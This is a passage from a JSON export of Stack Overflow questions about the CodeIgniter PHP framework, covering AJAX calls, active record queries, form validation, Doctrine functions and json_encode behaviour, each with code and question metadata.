$('div#thread_list').html(html['content']);\n            }\n        });\n    }\n});\n</code></pre>\n\n<p>So, as you can see, on page load, it kicks off <code>load_custom_topics</code> which runs just fine.  Its then supposed to call <code>get_threads()</code>.  This is where the thing stops, and I get no data.</p>\n\n<p>Get_threads()</p>\n\n<pre><code>public function get_threads()\n{\n    $session = $this-&gt;session-&gt;userdata('active_topic');\n    if ($this-&gt;input-&gt;post('page') == '1')\n    {\n        $data['list'] = $this-&gt;right_model-&gt;thread_list_all();\n        $data['test'] = \"all\";\n    } else {\n        $data['list'] = $this-&gt;right_model-&gt;thread_list_other($session);\n        $data['test'] = \"not all\";\n    }\n    if ($data['list'] == FALSE)\n    {\n        $content = \"no hits\";\n    } else {\n    $content = $this-&gt;load-&gt;view('right/thread_list', $data, TRUE);\n    }\n    $data['content'] = $content;\n    $this-&gt;output-&gt;set_content_type('application/json')-&gt;set_output(json_encode($data));\n}\n</code></pre>\n\n<p>While I create the 'page' dynamically, the HTML outputs to this:</p>\n\n<p><code>&lt;div name=\"page\" value=\"1\"&gt;&lt;/div&gt;</code></p>\n\n<p>Any reason why <code>get_threads()</code> is not running?</p>\n"},{"tags":["codeigniter","rest","continuous-integration","digest"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12459677,"title":"Authentication codeigniter-restserver","body":"<p>I am having trouble with authentication in codeigniter-restserver.</p>\n\n<p>When I set the config: <code>$config['rest_auth']</code> to either <code>basic</code> or <code>digest</code>, I can't seem to get through the validation, using the standard logins.</p>\n\n<p>Is there anything else I need to take into account?</p>\n"},{"tags":["php","arrays","codeigniter","multidimensional-array"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12569368,"title":"Compare todays dayname and time through array?","body":"<p>I have an array like this:</p>\n\n<p>Array\n(</p>\n\n<pre><code>[0] =&gt; stdClass Object\n    (\n        [Start] =&gt; 08:00\n        [dayName] =&gt; Tuesday\n        [dayID] =&gt; 2\n        [courseName] =&gt; Math\n\n    )\n\n[1] =&gt; stdClass Object\n    (\n        [Start] =&gt; 10:00\n        [dayName] =&gt; Tuesday\n        [dayID] =&gt; 2\n        [courseName] =&gt; Geography\n    )\n\n[2] =&gt; stdClass Object\n    (\n        [Start] =&gt; 14:00\n        [dayName] =&gt; Tuesday\n        [dayID] =&gt; 2\n        [courseName] =&gt; Science\n    )\n\n[3] =&gt; stdClass Object\n    (\n        [Start] =&gt; 10:00\n        [dayName] =&gt; Thursday\n        [dayID] =&gt; 4\n        [courseName] =&gt; Math\n    )\n\n[4] =&gt; stdClass Object\n    (\n        [Start] =&gt; 18:00\n        [dayName] =&gt; Friday\n        [dayID] =&gt; 5\n        [courseName] =&gt; History\n    )\n</code></pre>\n\n<p>)\nWhat I want to do is , I want to compare the daya nd time now to the values in the array. For example lets assume that it is 7:00 am and it is Tuesday. Then I want to get the Object[0]. But if it is 11:00 o'clock then i need to get the  Object[2] which starts at 14:00 on Tuesday.\nIt it is Tuesday and 16:00 o'clock then i need Object[3] . </p>\n\n<p>If it is a weekend then i need the beginning of the week which is Tuesday at 08:00 with the Math Course.</p>\n\n<p>I tried to get that using key => value but I mixed up.\nHow can I compare the Day and then time and in case there is a Course on that combination just pick it up if not just continue checking.</p>\n\n<p>regards\nlittleblue </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12566272,"title":"CodeIgniter Add Book & Categories","body":"<p>Ok here is what I want to do:</p>\n\n<p>I have an add book form with certain elements such as title, description, author and image etc. In the add form I also have some checkboxes which are the categories the user wants to place the book in. So far, when the user clicks the add book button on the form, all the inputs are validated, the book information is inserted to the database and the image is uploading successfully.</p>\n\n<p>Once all this has happened, <strong>in the model</strong> I am returning the book_id of the record which has just been added to the db and inserting it into another table, like this:</p>\n\n<pre><code>$book_id = $this-&gt;db-&gt;insert_id();\n$data = array(\n        'book_linktable_book_id' =&gt; $book_id,\n    );\n$this-&gt;db-&gt;insert('book_linktable', $data);\n</code></pre>\n\n<p>I need to insert the book_category_id into this other table along with the book_id. <strong>So for each category the user has selected, insert the book_id and book_category_id into this other table.</strong></p>\n\n<p>Here is the controller code:</p>\n\n<pre><code>function create_book(){\n    $this-&gt;form_validation-&gt;set_rules('title', 'Title', 'trim|xss_clean|required|max_length[50]');\n    $this-&gt;form_validation-&gt;set_rules('description', 'Description', 'trim|xss_clean|required|max_length[600]');\n    $this-&gt;form_validation-&gt;set_rules('exam_grade', 'Exam Grade', 'trim|xss_clean|required|max_length[10]');\n    $this-&gt;form_validation-&gt;set_rules('author', 'Author', 'trim|xss_clean|required|max_length[25]');\n    $this-&gt;form_validation-&gt;set_rules('edition', 'Edition', 'trim|xss_clean|required|max_length[15]');\n    $this-&gt;form_validation-&gt;set_rules('publisher', 'Publisher', 'trim|xss_clean|required|max_length[30]');\n    $this-&gt;form_validation-&gt;set_rules('price', 'Price', 'trim|xss_clean|required');\n    if ($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        $data = $this-&gt;style_model-&gt;admin_area();\n        $data['category_query'] = $this-&gt;admin_books_model-&gt;get_book_categories();\n        $data['page_title'] = 'Add New Book';\n        $this-&gt;load-&gt;view('admin/books/add_book', $data);\n    }\n    else\n    {           \n        //upload the image and create thumbnail\n        $config['upload_path'] = APPPATH . 'uploads/';\n        $config['allowed_types'] = 'jpeg|jpg|gif|png';\n        $config['max_size'] = '1024';\n        $this-&gt;load-&gt;library('upload', $config);\n\n        $field_name = \"image\";\n        if( ! $this-&gt;upload-&gt;do_upload($field_name))\n        {\n            //failed to upload\n            $data = $this-&gt;style_model-&gt;admin_area();\n            $data['category_query'] = $this-&gt;admin_books_model-&gt;get_book_categories();\n            $data['page_title'] = 'Add New Book';\n            $this-&gt;form_validation-&gt;set_message(\"image\", \"Image size too large\");\n            $this-&gt;load-&gt;view('admin/books/add_book', $data);\n        }\n        else\n        {\n            //image uploaded\n            $data = $this-&gt;input-&gt;post('category');\n            $this-&gt;load-&gt;view('admin/category', $data);\n            /*$upload_data = $this-&gt;upload-&gt;data('file_name');\n            $image_name = $upload_data['file_name'];\n            $this-&gt;admin_books_model-&gt;add_book($image_name);\n            $this-&gt;session-&gt;set_flashdata('msg', 'New Book Created');\n            redirect('admin_books');*/\n        }\n    }   \n} //function create_book()\n</code></pre>\n\n<p>Here is the model code:</p>\n\n<pre><code>function add_book($image_name){\n    $data = array(\n          'book_name' =&gt; $this-&gt;input-&gt;post('title'),\n          'book_description' =&gt; $this-&gt;input-&gt;post('description'),\n          'book_grade' =&gt; $this-&gt;input-&gt;post('exam_grade'),\n          'book_author' =&gt; $this-&gt;input-&gt;post('author'),\n          'book_edition' =&gt; $this-&gt;input-&gt;post('edition'),\n          'book_publisher' =&gt; $this-&gt;input-&gt;post('publisher'),\n          'book_price' =&gt; $this-&gt;input-&gt;post('price'),\n          'book_image' =&gt; $image_name,\n        );\n    $this-&gt;db-&gt;insert('books', $data);\n\n    $book_id = $this-&gt;db-&gt;insert_id();\n    //for each category selected, getthe id and insert into link table\n\n\n    $data = array(\n        'book_linktable_book_id' =&gt; $book_id,\n    );\n    $this-&gt;db-&gt;insert('book_linktable', $data);\n} //function add_book()\n</code></pre>\n\n<p>Here is the form code in the view:</p>\n\n<pre><code>&lt;div id=\"left_form_content\"&gt;\n            &lt;?php echo form_open_multipart('admin_books/create_book'); ?&gt;\n            &lt;?php echo form_label('Title') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_input('title', set_value('title')); ?&gt;\n            &lt;?php echo form_error('title') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_label('Exam Grade') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_input('exam_grade', set_value('exam_grade')); ?&gt;\n            &lt;?php echo form_error('exam_grade') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_label('Edition') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_input('edition', set_value('edition')); ?&gt;\n            &lt;?php echo form_error('edition') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_label('Author') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_input('author', set_value('author')); ?&gt;\n            &lt;?php echo form_error('author') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_label('Publisher') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_input('publisher', set_value('publisher')); ?&gt;\n            &lt;?php echo form_error('publisher') . \"&lt;br /&gt;\"; ?&gt;\n        &lt;/div&gt;\n        &lt;div id=\"right_form_content\"&gt;\n            &lt;?php echo form_label('Description') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_textarea('description', set_value('description')); ?&gt;\n            &lt;?php echo form_error('description') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_label('Categories') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php\n                foreach($category_query as $data) {\n                    echo \"&lt;input type='checkbox' name='category[]' value='\" . $data-&gt;book_category_id . \"'&gt;\" . $data-&gt;book_category_name . \"&lt;/input&gt;\" . \"&lt;br /&gt;\";\n                }\n            ?&gt;          \n            &lt;?php echo form_error('categories') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_label('Image') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_upload('image', set_value('image')); ?&gt;\n            &lt;?php echo form_error('image') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_label('Price') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_input('price', set_value('price')); ?&gt;\n            &lt;?php echo form_error('price') . \"&lt;br /&gt;\"; ?&gt;\n            &lt;?php echo form_submit('submit', 'Add Book'); ?&gt;\n            &lt;?php echo form_close(); ?&gt;\n        &lt;/div&gt;\n        &lt;div class=\"clear\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>Thanks in advance for any help,</p>\n\n<p>Tom</p>\n\n<p>EDIT:</p>\n\n<p>Here are the DB Tables:</p>\n\n<pre><code>Books\nbook_id\nbook_title\nbook_description\nbook_author\nbook_grade\nbook_edition\nbook_publisher\nbook_image\nbook_price\n\nbook_categories\nbook_category_id\nbook_category_name\n\n\nbook_linktable\n    book_linktable_book_id\n    book_linktable_book_category_id\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12568067,"title":"How to handle an array in a SQL field?","body":"<p>I have a feed that comes from the State of Florida in a CSV that I need to load daily into MySQL.  It is a listing of all homes for sale in my area.  One field has a list of codes, separated by commas.  Here's one such sample:</p>\n\n<pre><code>C02,C11,U01,U02,D02,D32,D45,D67\n</code></pre>\n\n<p>These codes all mean something (pool, fenced in area, etc) and I have the meanings in a separate table.  My question is, how should I handle loading these?  Should I put them in their own field as they are in the CSV?  Should I create a separate table that holds them?</p>\n\n<p>If I do leave them as they are in a field (called feature_codes), how could I get the descriptions out of a table that has the descriptions?  That table is simply feature_code, feature_code_description.  I don't know how to break them apart in my first query to do the join to bring the description in.</p>\n\n<p>Thank you</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12557761,"title":"Is there a way to specify \"USE INDEX\" or \"FORCE INDEX\" in CodeIgniter","body":"<p>Is it possible to specify \"USE INDEX\" or \"FORCE INDEX\" in CodeIgniter, other than using</p>\n\n<pre><code>$this-&gt;db-&gt;query()\n</code></pre>\n\n<p>What I mean is if it's possible to insert \"FORCE INDEX\" somewhere in one of ActiveRecord's methods.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12565720,"title":"CodeIgniter - how to access base_url() in a helper?","body":"<p>I'm extending URL helper (MY_url_helper). How do I access base_url() within my helper function? I'm actually overriding base_url(), so I need to call the original base_url.</p>\n\n<p><strong>Edit 1:</strong></p>\n\n<p>This doesn't work:</p>\n\n<pre><code>$CI =&amp; get_instance();\n$CI-&gt;load-&gt;helper('url');\n$base_url = $CI-&gt;base_url();\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12566651,"title":"post a mysql data from controller to view in CodeIgniter","body":"<p>I'm trying to send from a controller to a view an array of all contacts who are in my database table \"Contacts\" and then display them on a drop down menu.I followed the CodeIgniter documentation about this topic <a href=\"http://codeigniter.com/user_guide/general/views.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/general/views.html</a> but it isn't really what I would like to do.\nHere is what I tried to do :</p>\n\n<pre><code>function getAll_contact(){\n     $exist= $this-&gt;contacts_model-&gt;get_all('contacts');\n     if($exist)\n        {\n            $all_contact = $this-&gt;contacts_model-&gt;read('contacts');\n        //echo json_encode($all_contact); prints all the contacts in the table\n                    $this-&gt;load-&gt;view('myView', $contact);\n        }\n    }\n</code></pre>\n\n<p>In my view :</p>\n\n<pre><code>      &lt;select class=\"span4\"&gt;\n          &lt;?php if(isset($all_contact) &amp;&amp; ! empty($all_contact)){ \n            foreach($all_contact as $contact){\n            echo \"&lt;option value='\".$contact-&gt;id_contact.\"'&gt;\".$contact-&gt;company.\"&lt;/option&gt;\";\n\n\n    }\n}\n      &lt;/select&gt;\n</code></pre>\n\n<p>This does not show anything on the drop down menu. Could anyone help me please ?</p>\n"},{"tags":["php","sql","database","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":12518069,"title":"Codeigniter 2 active record — How do I create temporary table to apply second sort order?","body":"<p>I am in the middle of updating an old site. One of the things I am doing is rewriting the database queries because I have changed the structure of the database to make it more flexible and configurable from the admin.</p>\n\n<p>I previously used the following query (and many others like it), which rely on a temporary table:</p>\n\n<pre><code>$query = $this-&gt;db-&gt;query(\"SELECT * FROM (SELECT * FROM Links WHERE Cat LIKE ('$c') AND Type LIKE ('%$x%') LIMIT $s, $l) AS T ORDER BY $sort $o\");\n</code></pre>\n\n<p>Because the queries have got more complicated and now involve a lot of joins I have decided to use active record syntax to make them easier to read. The problem is I cannot find any info on how to make a temporary table to apply a second sort to the data using active record; surely this is possible?</p>\n\n<p>Here is my new query:</p>\n\n<pre><code>    $this-&gt;db\n        -&gt;select('*')\n        -&gt;from('item_categories')\n        -&gt;where('item_categories.cat_id', $c)\n        -&gt;or_where('item_categories.parent_id', $c)\n        -&gt;or_where('item_categories.gparent_id', $c)\n        -&gt;join('item_categories_rel', 'item_categories_rel.cat_id = item_categories.cat_id', 'right')\n        -&gt;join('item_entries', 'item_entries.item_id = item_categories_rel.item_id','right')\n        -&gt;join('ratings_total', 'ratings_total.item_id = item_entries.item_id')\n        -&gt;order_by(\"item_name\", \"asc\")\n        -&gt;limit($l, $s);\n        // up to here I want to store as a temporary table then apply next order\n        //-&gt;order_by($sort, $o); - ideally I want to apply a second order like this\n    $result = $this-&gt;db-&gt;get();\n</code></pre>\n\n<p>I would like to apply 'order by' twice but this doesn't work — active record is not that cleaver (or more likeley would be ambiguous), how can I can I do this this within active record? </p>\n\n<p>Any help is much appreciated. Failing the active record approach can anyone suggest how I might apply a sort to the result object?</p>\n"},{"tags":["codeigniter","yii"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":546,"score":-3,"question_id":12565260,"title":"Yii vs CodeIgniter","body":"<p>I've been looking for a working tool for programming in php, and read many articles already, and from what I see are the best Yii and CodeIgniter. And was wondering what your opinion about it. Which is better for you guys so I can decide what I will use.</p>\n"},{"tags":["php","jquery","html","codeigniter","anchor"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12526168,"title":"Strange anchor tag behaviour","body":"<p>In my view im doing this :</p>\n\n<pre><code>&lt;?php if($user_can_write) {?&gt;\n&lt;a href=&lt;?php echo base_url('backend_controllers/users/foo')?&gt; style=\"text-decoration:none\"&gt;\nAdd&lt;/a&gt;\n&lt;?php } ?&gt;\n</code></pre>\n\n<p>I pass variable $user_can_write from my controller , which is my implementation for access control, the <strong>strange part</strong> is whenever i refresh this page , ie this view , the anchor tag is executed , ie , the foo function in user controller is called and executed , every time !Basically the foo function increments the db by one row (adds row to the db), so this is really not practical for me that on every refresh the anchor tag executes</p>\n\n<p>Now if i do this implementation in the view (alternate approach) :</p>\n\n<pre><code>&lt;?php if($user_can_write) {?&gt;\n&lt;a href='javascript:void(0);' onclick=\"on_click_method_for_anchor()\" style=\"text-decoration:none\"&gt;\nAdd&lt;/a&gt;\n&lt;?php } ?&gt;\n</code></pre>\n\n<p>and further in my javascript i do this :</p>\n\n<pre><code>function on_click_method_for_anchor(){\n$.ajax({\n            url: '&lt;?php echo base_url('backend_controllers/user/foo'); ?&gt;',            \n            type: 'POST',\n            success: function(result){                \n                $('.my_span_tag_class').html(result)\n            }\n        });\n</code></pre>\n\n<p>this seems to work perfect , and even if i reload the page , the foo is not called , can someone please tell me why is the <strong>anchor tag behaving like this</strong> ? am i missing out something obvious ?</p>\n"},{"tags":["codeigniter","hindi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":57,"score":0,"question_id":12564360,"title":"how to create Hindi website in codeignitor?","body":"<p>I need create a website which should available to the users in Hindi as well as in English.</p>\n\n<p>Any suggestions ?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>When i try to save <code>hindi_lang.php</code> it's not saving just giving unicode error..</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":5931,"score":1,"question_id":2567117,"title":"Codeigniter - Call to undefined method CI_DB_mysql_driver::","body":"<p>I am getting this error \"Fatal error: Call to undefined method CI_DB_mysql_driver::findVenueInfo()\" when I try to use one of my models.</p>\n\n<p>I have a view with this anchor:</p>\n\n<pre><code>echo anchor('welcome/searchVenue/' . $row-&gt;venue_id, $row-&gt;venue);\n</code></pre>\n\n<p>which generates a link like: <a href=\"http://localhost/ci-llmg/index.php/welcome/searchVenue/1\" rel=\"nofollow\">http://localhost/ci-llmg/index.php/welcome/searchVenue/1</a></p>\n\n<p>the method called is</p>\n\n<pre><code>function searchVenue()\n{\n    $this-&gt;load-&gt;model('venues');\n    //get venue info\n    $data['info'] = $this-&gt;venues-&gt;findVenueInfo($this-&gt;uri-&gt;segment(3)); //this line generates the error\n\n}\n</code></pre>\n\n<p>and the findVenueInfo function in the model (venues.php) is:</p>\n\n<pre><code>function findVenueInfo($id)\n{\n    $data = array();\n    $this-&gt;db-&gt;where('id', $id);\n\n    $Q = $this-&gt;db-&gt;get('venues');\n    if ($Q-&gt;num_rows() &gt; 0)\n    {\n        foreach ($Q-&gt;result() as $row)\n        {\n            $data[] = $row;\n        }\n    }\n\n    $Q-&gt;free_result();\n    return $data;\n}\n</code></pre>\n\n<p>..but the result of this is Fatal error: Call to undefined method CI_DB_mysql_driver::findVenueInfo()\nI'm probably missing something stupid, but can't get it to work! What do you think?</p>\n"},{"tags":["jquery","codeigniter","foreach","modal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12563161,"title":"CodeIgniter is only executing JS once inside a loop","body":"<p>I am using CodeIgniter to display a list of items from the database. I want to delete an item based on it's ID. This is not a problem and works fine without the modal box. </p>\n\n<p>My issue is that I am using a jQuery plugin called reveal (http://goo.gl/3lzRN) to add a modal box to confirm deletion. This works for the first item in the list, but the others have the same ID as the first. </p>\n\n<pre><code>&lt;a href=\"pages/&lt;?php echo $row-&gt;id; ?&gt;\" class=\"delete\"&gt;\n    &lt;i class=\"icon-cancel\"&gt;&lt;/i&gt;&lt;span class=\"delete_tooltip\"&gt;delete page&lt;/span&gt;\n&lt;/a&gt;\n\n&lt;aside id=\"modal\"&gt;\n    &lt;header id=\"delete_page\"&gt;Delete Page&lt;/header&gt;\n    &lt;article id=\"modal_content\"&gt;\n        &lt;p&gt;\n        Are you sure you want to delete the page&lt;br /&gt;'&lt;?php echo $row-&gt;title ?&gt;'?\n        &lt;/p&gt;\n\n        &lt;p&gt;This action cannot be undone.&lt;/p&gt;\n\n        &lt;p&gt;\n        &lt;a href=\"pages/delete_page/&lt;?php echo $row-&gt;id; ?&gt;\" &gt;\n            &lt;i class=\"icon-cancel\"&gt;&lt;/i&gt;Delete\n        &lt;/a&gt; &lt;a href=\"pages/#\" class=\"modal_cancel\"&gt;Cancel&lt;/a&gt; \n        &lt;/p&gt;\n    &lt;/article&gt;\n&lt;/aside&gt;\n</code></pre>\n\n<p>Above is the link to open the modal box, and the content in it. These are within a foreach loop, but as I know the loop works fine, I haven't posted it. </p>\n"},{"tags":["php","mysql","codeigniter","doctrine","datediff"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12563333,"title":"CodeIgniter - Doctrine - DateDiff","body":"<p>I have been meaning to use the MySQL DATEDIFF function but I have never been successful.</p>\n\n<p>I followed the tutorial here:</p>\n\n<p><a href=\"http://docs.doctrine-project.org/projects/doctrine-orm/en/2.1/cookbook/dql-user-defined-functions.html\" rel=\"nofollow\">http://docs.doctrine-project.org/projects/doctrine-orm/en/2.1/cookbook/dql-user-defined-functions.html</a></p>\n\n<p>I have set the configuration properly</p>\n\n<pre><code>$config = new Configuration;\n$config-&gt;addCustomStringFunction('DATEDIFF', 'Project\\ORM\\MySql\\DateDiff');\n</code></pre>\n\n<p>I also placed the file to the correct location. </p>\n\n<p>Currently, the path for my under libraries is:</p>\n\n<pre><code>libraries\n--Doctrine\n--Project\n----ORM\n------MySql\n---------DateDiff.php\n--Doctrine.php\n</code></pre>\n\n<p>And my code for DateDiff.php is:</p>\n\n<pre><code>class DateDiff extends FunctionNode\n{\n// (1)\npublic $firstDateExpression = null;\npublic $secondDateExpression = null;\n\npublic function parse(\\Doctrine\\ORM\\Query\\Parser $parser)\n{\n    $parser-&gt;match(Lexer::T_IDENTIFIER); // (2)\n    $parser-&gt;match(Lexer::T_OPEN_PARENTHESIS); // (3)\n    $this-&gt;firstDateExpression = $parser-&gt;ArithmeticPrimary(); // (4)\n    $parser-&gt;match(Lexer::T_COMMA); // (5)\n    $this-&gt;secondDateExpression = $parser-&gt;ArithmeticPrimary(); // (6)\n    $parser-&gt;match(Lexer::T_CLOSE_PARENTHESIS); // (3)\n}\n\npublic function getSql(\\Doctrine\\ORM\\Query\\SqlWalker $sqlWalker)\n{\n    return 'DATEDIFF(' .\n        $this-&gt;firstDateExpression-&gt;dispatch($sqlWalker) . ', ' .\n        $this-&gt;secondDateExpression-&gt;dispatch($sqlWalker) .\n    ')'; // (7)\n}\n}\n</code></pre>\n\n<p>And this is how I attempt to catch it:</p>\n\n<pre><code>$this-&gt;doctrine-&gt;em-&gt;\ncreateQuery('SELECT a FROM models\\user_table a \nWHERE a.user_id = '.$user_id.' \nAND DATEDIFF(NOW(), a.created_at) &lt; 1')\n-&gt;getResult();\n</code></pre>\n\n<p>I basically just copied over what was written in the cookbook.</p>\n\n<p>However, I can't get it to work as my application fails to display any output. No errors. It just stops there. </p>\n\n<p>Anybody has any idea where the issue might be? Is it a pathing issue?  Or am I not calling it correctly?</p>\n\n<p>Any advice would be greatly appreciated. </p>\n\n<p>Thanks!</p>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":778,"score":0,"question_id":10243501,"title":"get validation errors through jquery ajax and codeigniter","body":"<p>Hi guys i just want to ask why my ajax request does get an string of <strong>FALSE</strong> (it should get the error messages from controller). </p>\n\n<p>Here is the snippet of controller </p>\n\n<pre><code>    function ajax_verify(){\n    $this-&gt;form_validation-&gt;set_rules('username', '', 'max_length[25]|min_length[4]|trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('email', '', 'valid_email|required|trim|xss_clean');  \n\n    if($this-&gt;form_validation-&gt;run()==FALSE){\n             $errors = $this-&gt;form_validation-&gt;error_array();\n             echo json_encode($this-&gt;form_validation-&gt;error_array());\n    }else{\n            echo \"Success!\";\n       }\n\n    }\n</code></pre>\n\n<p>I Extended the Library to get the error Messages (It works perfectly fine in php validation)</p>\n\n<pre><code>class MY_Form_validation extends CI_Form_validation{\n\n\nfunction __construct(){\n    parent::__construct();\n}\n\nfunction error_array(){\n    if(count($this-&gt;_error_array)===0){\n        return FALSE;\n    }else{\n        return $this-&gt;_error_array;\n    }\n}\n\nfunction get_tae(){\n    return \"TAE!\";\n }\n}\n</code></pre>\n\n<p>and last the view and the jquery ajax code (Returning false instead of the errors).</p>\n\n<pre><code>     &lt;!DOCTYPE HTML&gt;\n     &lt;html&gt;\n     &lt;head&gt;\n          &lt;meta charset=\"utf-8\"&gt;\n          &lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js\"&gt;&lt;/script&gt;\n         &lt;title&gt;Title&lt;/title&gt;\n     &lt;body&gt;\n\n    &lt;?php //echo validation_errors('&lt;div class=\"error\"&gt;', '&lt;/div&gt;');?&gt;\n    &lt;?php echo form_open('ajax/ajax_verify', array('id'=&gt;'my_form'));?&gt;\n    &lt;?php echo form_label('Username'); ?&gt;\n    &lt;?php echo form_input('username', '', array('id' =&gt; 'username'));?&gt;\n    &lt;?php echo form_label('Email Address'); ?&gt;\n    &lt;?php echo form_input('email', '', array('id' =&gt; 'email')); ?&gt;\n    &lt;?php echo form_submit('submit', 'Submit'); ?&gt;\n    &lt;?php echo form_close();?&gt;\n\n    &lt;script type=\"text/javascript\"&gt;\n     $(function(){\n          $('#my_form').submit(function(e){\n                $.get('ajax_verify', function(data){\n                    $('#contents').append(data);\n                }, 'json') ;                   \n                e.preventDefault();\n            })\n\n\n      });\n           &lt;/script&gt;\n</code></pre>\n"},{"tags":["php","json","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":69,"score":4,"question_id":12562350,"title":"Different Results for json_encode() PHP","body":"<p>If i do this : </p>\n\n<pre><code>$new_arr = array(\n0 =&gt; 'keyboard',\n1 =&gt; 'mouse',\n2 =&gt; 'computer'\n);\n\nprint_r(json_encode($new_arr));\n</code></pre>\n\n<p>Output:</p>\n\n<blockquote>\n  <p>[\"keyboard\",\"mouse\",\"computer\"]</p>\n</blockquote>\n\n<p>But say i fetch all rows of \"product\" table from my database and i do this :</p>\n\n<pre><code>$product_with_id_map = array();\nforeach($query as $result) {\n$product_with_id_map[$result-&gt;id] = $result-&gt;name;\n}\nprint_r(json_encode($product_with_id_map));\n</code></pre>\n\n<p>Output:</p>\n\n<blockquote>\n  <p>{\"0\":\"Keyboard\",\"1\":\"mouse\",\"2\":\"computer\"}</p>\n</blockquote>\n\n<p>I really need to retain the key of the array when i json_encode also can you tell me how to achieve the second output in the 1st example ?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":819,"score":1,"question_id":8420312,"title":"Using jQuery JSON in CodeIgniter","body":"<p>In CI, I have setup a controller with a method of logsig(). Then in my index() method I'm calling a view called startpage. In my view I'm using JSON to make an asynchronous call between my view and my controller. How would I code the call. Below is the code I have:</p>\n\n<p>Contoller:</p>\n\n<pre><code>function logsig() {\n$this-&gt;load-&gt;view('startpage', $sync);\nheader('Content-type:application/json'); .............\n</code></pre>\n\n<p>View:</p>\n\n<pre><code>&lt;script type=\"text/javascript\" language=\"javascript\"&gt;\n$(document).ready(function() {\n    // blink script\n    $('#notice').blink();\n\n    $(\"#action_button\").click(function() {\n        var username = $(\"#username\").val();\n        var password = $(\"#password\").val();\n        var dataString = '&amp;username=' + username + '&amp;password=' + password;\n        if(username=='' ||  password=='') {\n            $('#success').fadeOut(400).hide();\n            $('#error').fadeOut(400).show();\n        } else {\n            $.ajax({\n            type: \"POST\",\n            dataType: \"JSON\",\n            url: \"processing/logsig.php\",\n            data: dataString,\n            json: {session_state: true},\n            success: function(data){\n            if(data.session_state == true) { // true means user is logged in.\n                $(\"#main1\").hide();\n                $('#main1').load('&lt;?=$sync?&gt;').fadeIn();\n            } else if(data.session_state == false) { // false means user is being registered.\n                $(\"#action_button\").remove();\n                $('#success').load('&lt;?=$sync?&gt;');\n                // onLoad fadeIn\n            }\n          }\n       });\n      }\n    });\n});\n&lt;/script&gt;\n</code></pre>\n"},{"tags":["jquery","ajax","codeigniter","jquery-ajax"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":698,"score":0,"question_id":2504898,"title":"Cannot display returned JSON from a JQUERY AJAX call in CodeIgniter","body":"<p>Im using JQUERY + CodeIgniter. I can't seem to get the returned <code>data</code> to display after an ajax call.</p>\n\n<p>Here is my JQUERY:</p>\n\n<pre><code>  $.post(\"&lt;?= site_url('plan/get_conflict') ?&gt;\", {\n    user_id : user_id,\n    datetime_from : plan_datetime_start,\n    datetime_to : plan_datetime_end,\n    json : true\n   }, function(data) {\n    alert(data);\n     }, \"json\");\n</code></pre>\n\n<p>Here is my CodeIgniter:</p>\n\n<pre><code>function get_conflict() {\n    ...\n log_message(\"debug\",\"get_conflict(): $result\");\n return $result;\n}\n</code></pre>\n\n<p>My logs show:</p>\n\n<pre><code>get_conflict(): {\"work_product_name\":\"Functional Design Document\",\"datetime_start_plan\":\"2010-04-22 08:00:00\",\"datetime_end_plan\":\"2010-04-22 09:00:00\",\"overlap_seconds\":3600}\n</code></pre>\n\n<p>Meaning the JSON is being returned correctly. However, the 